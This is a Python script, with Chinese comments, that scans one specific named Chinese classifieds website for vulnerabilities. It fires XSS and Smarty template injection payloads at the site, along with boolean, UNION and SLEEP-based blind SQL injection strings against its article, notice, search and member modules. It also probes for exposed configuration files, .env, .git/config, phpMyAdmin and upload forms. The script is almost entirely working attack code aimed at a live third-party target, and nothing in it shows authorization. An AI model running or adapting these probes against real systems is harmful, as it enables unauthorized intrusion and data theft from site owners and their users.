import subprocess
import time
import re

TARGET = "https://www.malaqin.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def curl_get(path, timeout=12, extra_headers=None):
    url = TARGET + path
    cmd = ["curl", "-s", "-i", "-A", UA, "--compressed", "--max-time", str(timeout), url]
    if extra_headers:
        for h in extra_headers:
            cmd.extend(["-H", h])
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = result.stdout
        if "\r\n\r\n" in output:
            headers_part, body = output.split("\r\n\r\n", 1)
        elif "\n\n" in output:
            headers_part, body = output.split("\n\n", 1)
        else:
            headers_part = output
            body = ""
        first_line = headers_part.split("\n")[0] if headers_part else ""
        status = first_line.split(" ")[1] if len(first_line.split(" ")) > 1 else "?"
        return {"status": status, "body": body, "body_len": len(body), "headers": headers_part}
    except Exception as e:
        return {"status": "ERROR", "body": "", "body_len": 0, "headers": str(e), "error": str(e)}

def curl_post(path, data, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-i", "-A", UA, "--compressed", "--max-time", str(timeout),
           "-X", "POST", "-d", data, url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = result.stdout
        if "\r\n\r\n" in output:
            headers_part, body = output.split("\r\n\r\n", 1)
        elif "\n\n" in output:
            headers_part, body = output.split("\n\n", 1)
        else:
            headers_part = output
            body = ""
        first_line = headers_part.split("\n")[0] if headers_part else ""
        status = first_line.split(" ")[1] if len(first_line.split(" ")) > 1 else "?"
        return {"status": status, "body": body, "body_len": len(body), "headers": headers_part}
    except Exception as e:
        return {"status": "ERROR", "body": "", "body_len": 0, "headers": str(e), "error": str(e)}

def main():
    print("=" * 70)
    print("  玛拉沁信息网 (malaqin.cn) 漏洞验证")
    print(f"  目标: {TARGET}")
    print("=" * 70)

    # ============================================================
    print("\n[1] 模板变量注入/XSS 验证")
    print("-" * 60)
    
    # 测试 site_remen 变量是否可通过参数控制
    xss_tests = [
        # 测试模板变量是否可通过GET参数注入
        ("/?site_remen=test_xss_12345", "GET site_remen=test_xss_12345"),
        ("/index.php?site_remen=test_xss_12345", "GET index.php?site_remen=test_xss_12345"),
        ("/index.html?site_remen=test_xss_12345", "GET index.html?site_remen=test_xss_12345"),
        # XSS payload - 闭合引号
        ("/?site_remen=%22;alert(1);//", "XSS: 闭合引号 alert"),
        ("/index.php?site_remen=%22;alert(1);//", "XSS: index.php 闭合引号"),
        # Smarty模板注入测试
        ("/?site_remen={php}echo%20'xss_test';{/php}", "Smarty {php}标签注入"),
        ("/index.php?site_remen={php}echo%20'xss_test';{/php}", "Smarty {php} index.php"),
        # Smarty if标签注入
        ("/?site_remen={if%201==1}xss_test_if{/if}", "Smarty {if}标签注入"),
        ("/index.php?site_remen={if%201==1}xss_test_if{/if}", "Smarty {if} index.php"),
        # 测试 isapp 变量
        ("/?isapp=test_isapp_123", "GET isapp=test_isapp_123"),
        ("/index.php?isapp=test_isapp_123", "GET index.php?isapp=test_isapp_123"),
        ("/?isapp=%22;alert(1);//", "XSS: isapp 闭合引号"),
    ]
    
    for path, label in xss_tests:
        r = curl_get(path)
        body = r["body"]
        # 检查注入的标记是否出现在响应中
        markers = ["test_xss_12345", "xss_test", "xss_test_if", "test_isapp_123", "alert(1)"]
        found_markers = []
        for m in markers:
            if m in body:
                found_markers.append(m)
        
        # 同时检查模板变量是否被原样输出（未被解析）
        tpl_unresolved = "{$site_remen}" in body or "{$isapp}" in body
        
        if found_markers:
            print(f"  !! [{r['status']}] {r['body_len']}B  {label}")
            print(f"         发现标记: {found_markers}")
            # 找到标记所在行
            for m in found_markers:
                idx = body.find(m)
                context = body[max(0,idx-50):idx+80]
                print(f"         上下文: ...{context}...")
        elif tpl_unresolved:
            print(f"  ** [{r['status']}] {r['body_len']}B  {label}")
            print(f"         模板变量未解析(可能非模板引擎处理)")
        else:
            print(f"     [{r['status']}] {r['body_len']}B  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[2] SQL注入验证 - 各模块参数")
    print("-" * 60)
    
    # 基于 mh163k CMS 常见注入点
    sqli_tests = [
        # article 模块
        ("/article/article_16332.html", "article 基线"),
        ("/article/article_16332'+OR+1=1--.html", "article SQL注入 OR 1=1"),
        ("/article/article_16332'+AND+1=2--.html", "article SQL注入 AND 1=2"),
        ("/article/article_16332'+UNION+SELECT+1,2,3--.html", "article UNION注入"),
        # article list 参数
        ("/article/list_20_1_1756_0_1_1.html", "article list 基线"),
        ("/article/list_20_1_1756_0_1_1'+OR+1=1--.html", "article list SQL注入"),
        # notice 模块
        ("/notice/notice_376.html", "notice 基线"),
        ("/notice/notice_376'+OR+1=1--.html", "notice SQL注入"),
        ("/notice/notice_376'+AND+1=2--.html", "notice AND 1=2"),
        # info 模块
        ("/info/", "info 基线"),
        ("/info/?id=1'+OR+1=1--", "info?id SQL注入"),
        ("/info/?id=1'+AND+1=2--", "info?id AND 1=2"),
        # job 模块
        ("/job/", "job 基线"),
        ("/job/?id=1'+OR+1=1--", "job?id SQL注入"),
        # house 模块
        ("/house/", "house 基线"),
        ("/house/?id=1'+OR+1=1--", "house?id SQL注入"),
        # love 模块
        ("/love/", "love 基线"),
        ("/love/?id=1'+OR+1=1--", "love?id SQL注入"),
        # 搜索功能
        ("/index.php?m=search&kw=test123", "search 基线"),
        ("/index.php?m=search&kw=test123'+OR+1=1--", "search SQL注入"),
        ("/index.php?m=search&kw=test123'+AND+1=2--", "search AND 1=2"),
        # member 模块
        ("/member/", "member 基线"),
        ("/member/?uid=1'+OR+1=1--", "member uid SQL注入"),
        # tieba 模块
        ("/tieba/", "tieba 基线"),
        ("/tieba/?id=1'+OR+1=1--", "tieba?id SQL注入"),
    ]
    
    baseline_sizes = {}
    for path, label in sqli_tests:
        r = curl_get(path)
        status = r["status"]
        blen = r["body_len"]
        body = r["body"]
        
        # 检测SQL错误信息
        sql_errors = [
            "SQL syntax", "mysql_fetch", "mysql_query", "mysqli_error",
            "You have an error in your SQL syntax", "Warning: mysql",
            "Fatal error", "mysql_result", "SQLSTATE",
            "supplied argument is not a valid MySQL",
            "Division by zero", "odbc_exec", "Microsoft OLE DB",
        ]
        found_errors = [e for e in sql_errors if e.lower() in body.lower()]
        
        # 检测时间盲注特征（如果有显著延迟）
        
        if found_errors:
            print(f"  !! [{status}] {blen}B  {label}")
            print(f"         SQL错误: {found_errors}")
            for e in found_errors:
                idx = body.lower().find(e.lower())
                context = body[max(0,idx-30):idx+100]
                print(f"         上下文: ...{context}...")
        elif "OR 1=1" in label:
            # 对比基线
            base_label = label.replace("' OR 1=1--", "").replace(" SQL注入 OR 1=1", "")
            if base_label in baseline_sizes:
                diff = blen - baseline_sizes[base_label]
                if abs(diff) > 100:
                    print(f"  ** [{status}] {blen}B (差异:{diff:+d})  {label}")
                else:
                    print(f"     [{status}] {blen}B (差异:{diff:+d})  {label}")
            else:
                print(f"     [{status}] {blen}B  {label}")
        elif "AND 1=2" in label:
            base_label = label.replace("' AND 1=2--", "").replace(" AND 1=2", "")
            if base_label in baseline_sizes:
                diff = blen - baseline_sizes[base_label]
                if abs(diff) > 100:
                    print(f"  ** [{status}] {blen}B (差异:{diff:+d})  {label}")
                else:
                    print(f"     [{status}] {blen}B (差异:{diff:+d})  {label}")
            else:
                print(f"     [{status}] {blen}B  {label}")
        else:
            print(f"     [{status}] {blen}B  {label}")
            baseline_sizes[label] = blen
        time.sleep(0.3)

    # ============================================================
    print("\n[3] 时间盲注验证")
    print("-" * 60)
    
    time_tests = [
        ("/notice/notice_376.html", "基线", 0),
        ("/notice/notice_376'+AND+SLEEP(3)--.html", "SLEEP(3)盲注", 3),
        ("/article/article_16332.html", "article基线", 0),
        ("/article/article_16332'+AND+SLEEP(3)--.html", "article SLEEP(3)", 3),
        ("/index.php?m=search&kw=test'+AND+SLEEP(3)--", "search SLEEP(3)", 3),
        ("/index.php?m=search&kw=test", "search基线", 0),
    ]
    
    for path, label, expected_delay in time_tests:
        start = time.time()
        r = curl_get(path, timeout=15)
        elapsed = time.time() - start
        
        if expected_delay > 0 and elapsed > expected_delay:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label} - 可能存在时间盲注!")
        else:
            print(f"     [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
        time.sleep(0.5)

    # ============================================================
    print("\n[4] 敏感文件/路径探测")
    print("-" * 60)
    
    sensitive_paths = [
        "/admin/",
        "/admin/login.php",
        "/admin/index.php",
        "/manage/",
        "/manager/",
        "/system/",
        "/config.php",
        "/config.inc.php",
        "/db.php",
        "/database.php",
        "/conn.php",
        "/connection.php",
        "/.env",
        "/.git/config",
        "/backup/",
        "/bak/",
        "/data/",
        "/cache/",
        "/temp/",
        "/upload/",
        "/UploadFile/",
        "/phpmyadmin/",
        "/phpMyAdmin/",
        "/pma/",
        "/test.php",
        "/phpinfo.php",
        "/info.php",
        "/install/",
        "/install.php",
        "/debug.php",
        "/robots.txt",
        "/sitemap.xml",
        "/web.config",
        "/crossdomain.xml",
        "/template/wap/main/default/config.php",
        "/template/wap/main/default/db.php",
        "/template/config.php",
        "/include/config.php",
        "/include/db.php",
        "/includes/config.php",
        "/common/config.php",
        "/core/config.php",
        "/api/",
        "/api.php",
    ]
    
    for path in sensitive_paths:
        r = curl_get(path, timeout=8)
        status = r["status"]
        blen = r["body_len"]
        body = r["body"][:500]
        
        # 过滤掉标准404
        if status in ("200", "301", "302", "403", "500") and blen > 0:
            # 检查是否是真正的404页面
            if "404" not in body[:100] and "Not Found" not in body[:100]:
                print(f"  [{status}] {blen:6d}B  {path}")
                # 如果内容较少，可能是配置文件
                if blen < 500 and status == "200":
                    print(f"         内容: {body[:200]}")
        time.sleep(0.15)

    # ============================================================
    print("\n[5] 会员中心/文件上传验证")
    print("-" * 60)
    
    member_paths = [
        "/member/",
        "/member/login.php",
        "/member/register.php",
        "/member/index.php",
        "/memberinfo/",
        "/memberinfo/InfoPublish",
        "/memberarticle/",
        "/memberarticle/publisharticle",
        "/member/upload.php",
        "/member/file_upload.php",
        "/member/avatar.php",
        "/uc/",
        "/uc_server/",
    ]
    
    for path in member_paths:
        r = curl_get(path, timeout=8)
        status = r["status"]
        blen = r["body_len"]
        if status in ("200", "301", "302", "403") and blen > 100:
            print(f"  [{status}] {blen:6d}B  {path}")
            # 检查是否有上传表单
            if "upload" in r["body"].lower() or "file" in r["body"].lower():
                if "enctype" in r["body"].lower():
                    print(f"         !! 发现文件上传表单!")
        time.sleep(0.2)

    print("\n验证完成。")

if __name__ == "__main__":
    main()
